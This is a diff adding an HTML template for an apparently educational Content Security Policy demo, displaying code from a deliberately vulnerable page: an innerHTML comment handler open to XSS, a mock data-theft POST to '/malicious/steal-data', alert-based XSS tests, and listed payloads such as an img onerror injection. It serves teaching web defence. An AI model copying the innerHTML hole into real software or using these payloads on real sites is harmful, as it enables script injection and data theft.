@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= title %></title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <style>
+        body { 
+            background: #1a202c; 
+            color: #e2e8f0; 
+            font-family: 'Courier New', monospace;
+        }
+        .code-section { 
+            margin: 2rem 0; 
+            background: #2d3748; 
+            border-radius: 8px; 
+            overflow: hidden;
+        }
+        .code-header { 
+            background: #4a5568; 
+            padding: 1rem; 
+            color: #63b3ed; 
+            font-weight: bold;
+        }
+        .code-content { 
+            padding: 1.5rem; 
+        }
+        pre { 
+            margin: 0; 
+            white-space: pre-wrap; 
+            font-size: 14px; 
+            line-height: 1.5;
+        }
+        .vulnerability-warning {
+            background: #742a2a;
+            color: #fed7d7;
+            padding: 1rem;
+            border-radius: 4px;
+            margin: 1rem 0;
+            border-left: 4px solid #e53e3e;
+        }
+    </style>
+</head>
+<body>
+    <header style="background: #2d3748; padding: 2rem; text-align: center;">
+        <h1>Vulnerable Demo: JavaScript Code</h1>
+        <p>This page shows the JavaScript code used in the vulnerable (no CSP) demo</p>
+    </header>
+    
+    <main style="max-width: 1000px; margin: 0 auto; padding: 2rem;">
+        
+        <div class="vulnerability-warning">
+            <strong>⚠️ NO CSP PROTECTION</strong><br>
+            <strong>CSP Policy:</strong> None - All scripts execute without restriction<br>
+            <strong>Security Risk:</strong> XSS attacks succeed easily
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">Timer Functionality (✅ WORKS)</div>
+            <div class="code-content">
+                <pre><code>let timerCount = 60;
+const timerElement = document.getElementById('timer');
+
+function updateTimer() {
+    timerCount--;
+    timerElement.textContent = `Timer: ${timerCount}`;
+    if (timerCount <= 0) {
+        timerCount = 60;
+    }
+}
+
+setInterval(updateTimer, 1000);</code></pre>
+                <p style="color: #48bb78; margin-top: 1rem;">✅ Executes normally - no CSP restrictions</p>
+            </div>
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">Comment Form Handler (⚠️ VULNERABLE TO XSS)</div>
+            <div class="code-content">
+                <pre><code>function handleComment(event) {
+    event.preventDefault();
+    const username = document.getElementById('username').value;
+    const comment = document.getElementById('comment').value;
+    const commentsDiv = document.getElementById('comments');
+    
+    // VULNERABILITY: innerHTML allows script execution
+    const commentHTML = `&lt;div class="comment-item"&gt;
+        &lt;strong&gt;${username}:&lt;/strong&gt; ${comment}
+    &lt;/div&gt;`;
+    
+    commentsDiv.innerHTML += commentHTML;
+    document.getElementById('commentForm').reset();
+    return false;
+}</code></pre>
+                <p style="color: #f56565; margin-top: 1rem;">⚠️ XSS vulnerability: Injects user input directly into DOM via innerHTML</p>
+            </div>
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">Cross-Origin Data Submission (✅ WORKS)</div>
+            <div class="code-content">
+                <pre><code>function submitToCrossOrigin(event) {
+    event.preventDefault();
+    const data = document.getElementById('sensitiveData').value;
+    
+    fetch('/malicious/steal-data', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ sensitiveData: data })
+    })
+    .then(response => response.json())
+    .then(result => {
+        document.getElementById('crossOriginResult').innerHTML = 
+            `&lt;div class="result-success"&gt;
+                ⚠️ Data successfully sent to malicious domain: ${result.message}
+            &lt;/div&gt;`;
+    })
+    .catch(error => {
+        document.getElementById('crossOriginResult').innerHTML = 
+            `&lt;div class="result-error"&gt;
+                ⚠️ Cross-origin request failed: ${error.message}
+            &lt;/div&gt;`;
+    });
+}</code></pre>
+                <p style="color: #f56565; margin-top: 1rem;">⚠️ No restrictions on cross-origin requests to malicious domains</p>
+            </div>
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">XSS Test Functions (⚠️ ALL SUCCEED)</div>
+            <div class="code-content">
+                <pre><code>// Inline script execution - SUCCEEDS
+function testInlineScript() {
+    alert('Inline script executed successfully! This is an XSS vulnerability.');
+}
+
+// External script loading - SUCCEEDS  
+function testExternalScript() {
+    const script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js';
+    script.onload = () => alert('External script loaded successfully!');
+    script.onerror = () => alert('External script failed to load');
+    document.head.appendChild(script);
+}
+
+// Image XSS via onerror - SUCCEEDS
+function testImageXSS() {
+    const img = document.createElement('img');
+    img.src = 'nonexistent.jpg';
+    img.onerror = () => alert('Image XSS executed via onerror handler!');
+    document.body.appendChild(img);
+}</code></pre>
+                <p style="color: #f56565; margin-top: 1rem;">⚠️ All XSS vectors succeed - no CSP protection active</p>
+            </div>
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">Security Analysis</div>
+            <div class="code-content">
+                <pre><code>// Vulnerability Summary:
+// 1. No Content Security Policy headers
+// 2. innerHTML allows arbitrary script injection
+// 3. No restrictions on external script loading
+// 4. No restrictions on cross-origin requests
+// 5. Event handlers execute without restriction
+
+// Attack Vectors:
+// - XSS via comment form: &lt;img src=x onerror=alert('XSS')&gt;
+// - Script injection: &lt;script&gt;maliciousCode()&lt;/script&gt;
+// - External resource loading from any domain
+// - Data exfiltration to attacker-controlled domains
+
+// Mitigation: Implement Content Security Policy (see Basic CSP demo)</code></pre>
+                <p style="color: #ed8936; margin-top: 1rem;">📚 This demonstrates why CSP is essential for web security</p>
+            </div>
+        </div>
+
+    </main>
+</body>
+</html>
